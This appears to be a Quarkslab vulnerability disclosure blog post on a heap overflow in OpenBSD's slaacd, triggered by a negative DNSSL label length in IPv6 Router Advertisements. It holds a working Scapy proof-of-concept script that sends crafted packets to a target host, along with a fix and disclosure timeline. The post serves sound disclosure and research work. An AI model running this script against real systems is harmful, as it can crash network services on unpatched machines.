<!DOCTYPE html>
<html lang="en" prefix="og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml">
<head>
    <title>Heap Overflow in OpenBSD's slaacd via Router Advertisement - Quarkslab's blog</title>
    <!-- Using the latest rendering mode for IE -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <link href="./extras/favicon.png" rel="icon">

<link rel="canonical" href="./heap-overflow-in-openbsds-slaacd-via-router-advertisement.html">

        <meta name="author" content="Francisco Falcon" />
        <meta name="keywords" content="OpenBSD,IPv6,slaacd,Router Advertisement,Neighbor Discovery,2022" />
        <meta name="description" content="In this blog post we analyze a heap overflow vulnerability we discovered in the IPv6 stack of OpenBSD, more specifically in its slaacd daemon. This issue, whose root cause can be found in the mishandling of Router Advertisement messages containing a DNSSL option with a malformed domain label, was patched by OpenBSD on March 21, 2022. A proof-of-concept to reproduce the vulnerability is provided." />

        <meta property="og:site_name" content="Quarkslab's blog" />
        <meta property="og:type" content="article"/>
        <meta property="og:title" content="Heap Overflow in OpenBSD&#39;s slaacd via Router Advertisement"/>
        <meta property="og:url" content="./heap-overflow-in-openbsds-slaacd-via-router-advertisement.html"/>
        <meta property="og:description" content="In this blog post we analyze a heap overflow vulnerability we discovered in the IPv6 stack of OpenBSD, more specifically in its slaacd daemon. This issue, whose root cause can be found in the mishandling of Router Advertisement messages containing a DNSSL option with a malformed domain label, was patched by OpenBSD on March 21, 2022. A proof-of-concept to reproduce the vulnerability is provided."/>
        <meta property="article:published_time" content="2022-03-22" />
            <meta property="article:section" content="Vulnerability" />
            <meta property="article:tag" content="OpenBSD" />
            <meta property="article:tag" content="IPv6" />
            <meta property="article:tag" content="slaacd" />
            <meta property="article:tag" content="Router Advertisement" />
            <meta property="article:tag" content="Neighbor Discovery" />
            <meta property="article:tag" content="2022" />
            <meta property="article:author" content="Francisco Falcon" />



    <!-- Bootstrap -->
        <link rel="stylesheet" href="./theme/css/bootstrap.min.css" type="text/css"/>
    <link href="./theme/css/font-awesome.min.css" rel="stylesheet">
    <link href="./theme/css/font-awesome-brands.min.css" rel="stylesheet">
    <link href="./theme/css/font-awesome-solid.min.css" rel="stylesheet">

    <link href="./theme/css/pygments/default.css" rel="stylesheet">
    <link rel="stylesheet" href="./theme/css/style.css" type="text/css"/>
        <link href="./static/css/custom.css" rel="stylesheet">

        <link href="./feeds/all.atom.xml" type="application/atom+xml" rel="alternate"
              title="Quarkslab's blog ATOM Feed"/>

        <link href="./feeds/vulnerability.atom.xml" type="application/atom+xml" rel="alternate"
              title="Quarkslab's blog Vulnerability ATOM Feed"/>

</head>
<body>

<div class="navbar navbar-default navbar-fixed-top" role="navigation">
    <div class="container-fluid">
        <div class="navbar-header">
            <a href="./" class="navbar-brand">
Quarkslab's blog            </a>
        </div>
        <div class="collapse navbar-collapse navbar-ex1-collapse">
            <ul class="nav navbar-nav">
            </ul>
            <ul class="nav navbar-nav navbar-right">
              <li><a href="./archives.html"><i class="fa fa-th-list"></i><span class="icon-label">Archives</span></a></li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
</div> <!-- /.navbar -->

<!-- Banner -->
<!-- End Banner -->

<!-- Content Container -->
<div class="container-fluid">
    <div class="row">
        <div class="col-sm-7 col-sm-push-3">
    <section id="content">
        <article>
            <header class="page-header">
                <h1>
                    <a href="./heap-overflow-in-openbsds-slaacd-via-router-advertisement.html"
                       rel="bookmark"
                       title="Permalink to Heap Overflow in OpenBSD's slaacd via Router Advertisement">
                        Heap Overflow in OpenBSD's slaacd via Router Advertisement
                    </a>
                </h1>
            </header>
            <div class="entry-content">
                <div class="panel">
                    <div class="panel-body">
<footer class="post-info">
    <span class="label label-default">Date</span>
    <span class="published">
        <i class="fa fa-calendar"></i><time datetime="2022-03-22T00:00:00+01:00"> Tue 22 March 2022</time>
    </span>


            <span class="label label-default">By</span>
                <a href="./author/francisco-falcon.html"><i class="fa fa-user"></i> Francisco Falcon</a>

        <span class="label label-default">Category</span>
        <a href="./category/vulnerability.html">Vulnerability</a>


<span class="label label-default">Tags</span>
	<a href="./tag/openbsd.html"><i class="fa fa-solid fa-tag"></i>OpenBSD</a>
	<a href="./tag/ipv6.html"><i class="fa fa-solid fa-tag"></i>IPv6</a>
	<a href="./tag/slaacd.html"><i class="fa fa-solid fa-tag"></i>slaacd</a>
	<a href="./tag/router-advertisement.html"><i class="fa fa-solid fa-tag"></i>Router Advertisement</a>
	<a href="./tag/neighbor-discovery.html"><i class="fa fa-solid fa-tag"></i>Neighbor Discovery</a>
	<a href="./tag/2022.html"><i class="fa fa-solid fa-tag"></i>2022</a>
    
</footer><!-- /.post-info -->                    </div>
                </div>
                <div class="summary"><p class="first last">In this blog post we analyze a heap overflow vulnerability we discovered in the IPv6 stack of OpenBSD, more specifically in its <tt class="docutils literal">slaacd</tt> daemon. This issue, whose root cause can be found in the mishandling of Router Advertisement messages containing a DNSSL option with a malformed domain label, was patched by OpenBSD on March 21, 2022. A proof-of-concept to reproduce the vulnerability is provided.</p>
</div>
                <div class="section" id="introduction">
<h2>Introduction</h2>
<p>On February 21, 2022, the OpenBSD team published <a class="reference external" href="https://ftp.openbsd.org/pub/OpenBSD/patches/7.0/common/014_slaacd.patch.sig">security errata 014</a> addressing a buffer overflow in <a class="reference external" href="https://man.openbsd.org/slaacd.8">slaacd</a>. <tt class="docutils literal">slaacd</tt> is a stateless address autoconfiguration (SLAAC) daemon, which sends <tt class="docutils literal">Router Solicitation</tt> messages and parses the received <tt class="docutils literal">Router Advertisement</tt> answers. <tt class="docutils literal">Router Solicitation</tt> and <tt class="docutils literal">Router Advertisement</tt> messages are part of the <a class="reference external" href="https://tools.ietf.org/html/rfc4861">Neighbor Discovery protocol</a>, which in turn is part of the IPv6 protocol suite.</p>
<p>After being pointed to that bug in OpenBSD's <tt class="docutils literal">slaacd</tt> by a colleague, and being familiar with vulnerabilities related to <tt class="docutils literal">Router Advertisements</tt> (see our <a class="reference external" href="https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html">Windows</a> and <a class="reference external" href="https://blog.quarkslab.com/bad-neighbor-on-freebsd-ipv6-router-advertisement-vulnerabilities-in-rtsold-cve-2020-25577.html">FreeBSD</a> blog posts from the past), I couldn't resist taking a look at <tt class="docutils literal">slaacd</tt> in search of new vulnerabilities.</p>
</div>
<div class="section" id="router-advertisements-and-dnssl-options">
<h2>Router Advertisements and DNSSL Options</h2>
<p><tt class="docutils literal">Router Advertisement</tt> (RA for short) is one of the message types of the Neighbor Discovery (ND) protocol, which is part of the IPv6 protocol stack. <tt class="docutils literal">Router Advertisement</tt> messages are sent by routers to advertise their presence, together with various link and Internet parameters.</p>
<p><tt class="docutils literal">RA</tt> packets can contain a variable number of options. One of those options types is the <a class="reference external" href="https://tools.ietf.org/html/rfc6106#section-5.2">DNS Search List option</a> (<strong>DNSSL</strong> for short), which contains one or more domain names of DNS suffixes.</p>
<p>The <tt class="docutils literal">parse_dnssl</tt> function in <a class="reference external" href="https://github.com/openbsd/src/blob/997c6a4aecd34f2a5308d487eb77234a68f9781f/sbin/slaacd/engine.c#L1695">sbin/slaacd/engine.c</a> is in charge of parsing DNSSL options contained within <tt class="docutils literal">Router Advertisement</tt> messages.</p>
<p>Domain names included in a DNSSL option are encoded as a sequence of labels, with each label being represented as a one-byte length field followed by that number of bytes, as specified in <a class="reference external" href="https://datatracker.ietf.org/doc/html/rfc1035#section-3.1">section 3.1 of RFC 1035</a>. A domain name is terminated by a length byte of zero.</p>
<p>For example, the domain name <tt class="docutils literal">dns.quarkslab.com</tt> would be encoded this way:</p>
<img class="align-center" src="resources/2022-03-21-openbsd-slaacd-heap-overflow/domain-encoding.png" alt="Domain encoding" width="600" ></div>
<div class="section" id="the-vulnerability">
<h2>The Vulnerability</h2>
<p>This is the affected function, with relevant lines annotated on the left:</p>
<div class="highlight"><pre><span></span><span class="kt">char</span><span class="o">*</span>
<span class="nf">parse_dnssl</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">datalen</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">pos</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">nssl</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">nsslp</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="p">((</span><span class="n">nssl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">datalen</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">log_warn</span><span class="p">(</span><span class="s">&quot;malloc&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">nsslp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nssl</span><span class="p">;</span>

<span class="w">    </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">pos</span><span class="p">];</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">63</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">datalen</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">free</span><span class="p">(</span><span class="n">nssl</span><span class="p">);</span>
<span class="w">            </span><span class="n">log_warnx</span><span class="p">(</span><span class="s">&quot;invalid label in DNSSL&quot;</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">datalen</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">                </span><span class="o">*</span><span class="n">nsslp</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39; &#39;</span><span class="p">;</span><span class="w"> </span><span class="cm">/* seperator for next domain */</span>
<span class="w">            </span><span class="k">else</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="cm">/* no . at front */</span>
<span class="w">                </span><span class="o">*</span><span class="n">nsslp</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;.&#39;</span><span class="p">;</span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">         </span><span class="n">memcpy</span><span class="p">(</span><span class="n">nsslp</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">);</span>
<span class="w">            </span><span class="n">nsslp</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">len</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">datalen</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">nssl</span><span class="p">);</span>
<span class="w">        </span><span class="n">log_warnx</span><span class="p">(</span><span class="s">&quot;invalid label in DNSSL&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">nssl</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>The problem arises because a signed integer (the <tt class="docutils literal">int len</tt> variable at <tt class="docutils literal">[1]</tt>) is used when reading the length field of a label at <tt class="docutils literal">[2]</tt>.
By crafting a domain containing a label with a negative number in its <tt class="docutils literal">length</tt> field, it is possible to bypass the sanity checks at <tt class="docutils literal">[3]</tt>, which ultimately leads to a heap overflow at <tt class="docutils literal">[4]</tt>, in which <tt class="docutils literal">memcpy</tt> ends up being invoked with a huge unsigned value as its <tt class="docutils literal">size</tt> parameter.</p>
<p>Following the previous example, this diagram shows a malicious domain name with a bogus <tt class="docutils literal">length</tt> in its first label, which is enough to trigger the vulnerability:</p>
<img class="align-center" src="resources/2022-03-21-openbsd-slaacd-heap-overflow/malicious-label-length.png" alt="Malicious label length" width="600" ><p>Being a heap overflow due to a <tt class="docutils literal">memcpy</tt> with an extremely large <tt class="docutils literal">size</tt> argument, we consider that this bug is unlikely to be exploited for remote code execution.</p>
</div>
<div class="section" id="proof-of-concept">
<h2>Proof of Concept</h2>
<p>The following proof of concept, based on the Scapy Python library, demonstrates the vulnerability by answering to <tt class="docutils literal">Router Solicitation</tt> messages with a <tt class="docutils literal">Router Advertisement</tt> message containing a DNSSL option with a malformed domain label.</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">argparse</span>

<span class="kn">from</span> <span class="nn">scapy.layers.inet6</span> <span class="kn">import</span> <span class="n">IPv6</span><span class="p">,</span> <span class="n">ICMPv6ND_RA</span><span class="p">,</span> <span class="n">ICMPv6ND_RS</span><span class="p">,</span> <span class="n">ICMPv6NDOptRDNSS</span><span class="p">,</span> <span class="n">ICMPv6NDOptDNSSL</span>
<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="n">send</span><span class="p">,</span> <span class="n">sniff</span>



<span class="k">def</span> <span class="nf">create_dnssl_option</span><span class="p">():</span>
    <span class="n">dnssl</span>  <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!B&#39;</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">)</span>        <span class="c1"># type: DNS Search List option</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!B&#39;</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">)</span>        <span class="c1"># Length: 3 * 8 == 24 bytes</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!H&#39;</span><span class="p">,</span> <span class="mh">0x0000</span><span class="p">)</span>      <span class="c1"># Reserved</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!L&#39;</span><span class="p">,</span> <span class="mi">300</span><span class="p">)</span>         <span class="c1"># Lifetime: 300</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!B&#39;</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">)</span>        <span class="c1"># ***** This negative label length triggers the bug *****</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;dnssl&#39;</span>                       <span class="c1"># Label</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!B&#39;</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">)</span>        <span class="c1"># Label length</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;example&#39;</span>                     <span class="c1"># Label</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!B&#39;</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>        <span class="c1"># Length 0 marks the end of domain name</span>
    <span class="n">dnssl</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>                        <span class="c1"># Padding to fill 24 bytes</span>
    <span class="k">return</span> <span class="n">dnssl</span>


<span class="k">def</span> <span class="nf">dnssl_bug</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="n">ip</span> <span class="o">=</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">hlim</span><span class="o">=</span><span class="mi">255</span><span class="p">)</span>
    <span class="n">ra</span> <span class="o">=</span> <span class="n">ICMPv6ND_RA</span><span class="p">()</span>

    <span class="n">dnssl</span> <span class="o">=</span> <span class="n">create_dnssl_option</span><span class="p">()</span>

    <span class="n">pkt</span> <span class="o">=</span> <span class="n">ip</span><span class="o">/</span><span class="n">ra</span><span class="o">/</span><span class="n">dnssl</span>
    <span class="n">send</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">interface</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Waiting for ICMPv6ND_RS packets...&#39;</span><span class="p">)</span>
        <span class="n">rs</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">interface</span><span class="p">,</span> <span class="n">lfilter</span><span class="o">=</span><span class="k">lambda</span> <span class="n">pkt</span><span class="p">:</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">ICMPv6ND_RS</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Received Router Solicitation message from </span><span class="si">{}</span><span class="s1"> to </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rs</span><span class="p">[</span><span class="n">IPv6</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">rs</span><span class="p">[</span><span class="n">IPv6</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span><span class="p">))</span>

        <span class="k">if</span> <span class="n">rs</span><span class="p">[</span><span class="n">IPv6</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Triggering bug ...&#39;</span><span class="p">)</span>
            <span class="n">dnssl_bug</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Ignoring request from address </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rs</span><span class="p">[</span><span class="n">IPv6</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">))</span>



<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;Proof of concept for a heap overflow in OpenBSD&#39;s slaacd.&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--src&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Source IPv6 address to use&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--target&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;IPv6 address of the OpenBSD target&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--interface&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Name of the network interface to use&#39;</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
</pre></div>
</div>
<div class="section" id="fixes">
<h2>Fixes</h2>
<p>The OpenBSD team promptly fixed the reported vulnerability and released <a class="reference external" href="https://ftp.openbsd.org/pub/OpenBSD/patches/7.0/common/017_slaacd.patch.sig">security errata 017</a> for OpenBSD 7.0, and <a class="reference external" href="https://ftp.openbsd.org/pub/OpenBSD/patches/6.9/common/033_slaacd.patch.sig">security errata 033</a> for OpenBSD 6.9.</p>
</div>
<div class="section" id="disclosure-timeline">
<h2>Disclosure Timeline</h2>
<ul>
<li><p class="first"><strong>March 16, 2022</strong>: Vulnerability reported to the OpenBSD security team.</p>
</li>
<li><p class="first"><strong>March 16, 2022</strong>: The OpenBSD security team acknowledges receiving the report, expressing that they will handle the bug the upcoming week. The OpenBSD team states that they consider that the vulnerability would be exploitable if there weren't severe privilege separation and <a class="reference external" href="https://man.openbsd.org/pledge.2">pledge</a> involved.</p>
</li>
<li><p class="first"><strong>March 21, 2022</strong>: OpenBSD publishes <em>security errata 017</em> for OpenBSD 7.0, and <em>security errata 033</em> for OpenBSD 6.9, addressing the vulnerability.</p>
</li>
<li><p class="first"><strong>March 22, 2022</strong>: Quarkslab publishes this blog post.</p>
</li>
</ul>
</div>

            </div>
            <hr>
            <p>If you would like to learn more about our security audits and explore how we can help you, <a href="https://content.quarkslab.com/talk-to-our-experts-blog">get in touch with us</a>!</p>
            <!-- /.entry-content -->
        </article>
    </section>

        </div>
        <div class="col-sm-3 col-sm-pull-7" id="sidebar">
            <aside>
<!-- Sidebar -->
<section class="well well-sm">
  <ul class="list-group list-group-flush">
<!-- Sidebar/Quarkslab -->
<li class="list-group-item">
    <h4>
        <i class="fa-solid fa-earth-europe fa-lg"></i>
        <a href="https://quarkslab.com">
            Quarkslab's Website
        </a>
    </h4>
</li>
<!-- End Sidebar/Quarklab -->
<!-- Sidebar/Social -->
<li class="list-group-item">
  <h4>SOCIAL</h4>
  <ul class="list-group" id="social">
    <li class="list-group-item"><a class="text-capitalize" href="https://twitter.com/quarkslab"><i class="fa-brands fa-twitter fa-lg"></i> twitter</a></li>
    <li class="list-group-item"><a class="text-capitalize" href="https://infosec.exchange/@quarkslab"><i class="fa-brands fa-mastodon fa-lg"></i> mastodon</a></li>
    <li class="list-group-item"><a class="text-capitalize" href="https://github.com/quarkslab"><i class="fa-brands fa-github fa-lg"></i> github</a></li>
  </ul>
</li>
<!-- End Sidebar/Social -->

<!-- Sidebar/Categories -->
<li class="list-group-item">
  <h4>CATEGORIES</h4>
  <ul class="list-group" id="categories">
    <li class="list-group-item">
      <a href="./category/android.html"><i>â¢</i>Android</a>
    </li>
    <li class="list-group-item">
      <a href="./category/automotive.html"><i>â¢</i>Automotive</a>
    </li>
    <li class="list-group-item">
      <a href="./category/blockchain.html"><i>â¢</i>Blockchain</a>
    </li>
    <li class="list-group-item">
      <a href="./category/challenge.html"><i>â¢</i>Challenge</a>
    </li>
    <li class="list-group-item">
      <a href="./category/containers.html"><i>â¢</i>Containers</a>
    </li>
    <li class="list-group-item">
      <a href="./category/cryptography.html"><i>â¢</i>Cryptography</a>
    </li>
    <li class="list-group-item">
      <a href="./category/exploitation.html"><i>â¢</i>Exploitation</a>
    </li>
    <li class="list-group-item">
      <a href="./category/file-formats.html"><i>â¢</i>File Formats</a>
    </li>
    <li class="list-group-item">
      <a href="./category/fuzzing.html"><i>â¢</i>Fuzzing</a>
    </li>
    <li class="list-group-item">
      <a href="./category/hardware.html"><i>â¢</i>Hardware</a>
    </li>
    <li class="list-group-item">
      <a href="./category/kernel-debugging.html"><i>â¢</i>Kernel Debugging</a>
    </li>
    <li class="list-group-item">
      <a href="./category/life-at-quarkslab.html"><i>â¢</i>Life at Quarkslab</a>
    </li>
    <li class="list-group-item">
      <a href="./category/math.html"><i>â¢</i>Math</a>
    </li>
    <li class="list-group-item">
      <a href="./category/pentest.html"><i>â¢</i>Pentest</a>
    </li>
    <li class="list-group-item">
      <a href="./category/program-analysis.html"><i>â¢</i>Program Analysis</a>
    </li>
    <li class="list-group-item">
      <a href="./category/programming.html"><i>â¢</i>Programming</a>
    </li>
    <li class="list-group-item">
      <a href="./category/reverse-engineering.html"><i>â¢</i>Reverse-Engineering</a>
    </li>
    <li class="list-group-item">
      <a href="./category/software.html"><i>â¢</i>Software</a>
    </li>
    <li class="list-group-item">
      <a href="./category/vulnerability.html"><i>â¢</i>Vulnerability</a>
    </li>
  </ul>
</li>
<!-- End Sidebar/Categories -->
  </ul>
</section>
<!-- End Sidebar -->            </aside>
        </div>
        <div class="col-sm-2">
        </div>
    </div>
</div>
<!-- End Content Container -->

<footer>
   <div class="container-fluid">
      <hr>
      <div class="row">
         <div class="col-xs-10">&copy; 2024 Quarkslab
            &middot; Powered by <a href="https://github.com/getpelican/pelican-themes/tree/master/pelican-bootstrap3" target="_blank">pelican-bootstrap3</a>,
            <a href="http://docs.getpelican.com/" target="_blank">Pelican</a>,
            <a href="http://getbootstrap.com" target="_blank">Bootstrap</a>         </div>
         <div class="col-xs-2"><p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p></div>
      </div>
   </div>
</footer>
<script src="./theme/js/jquery.min.js"></script>

<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="./theme/js/bootstrap.min.js"></script>

<!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
<script src="./theme/js/respond.min.js"></script>

    <script src="./static/js/misc.js"></script>



</body>
</html>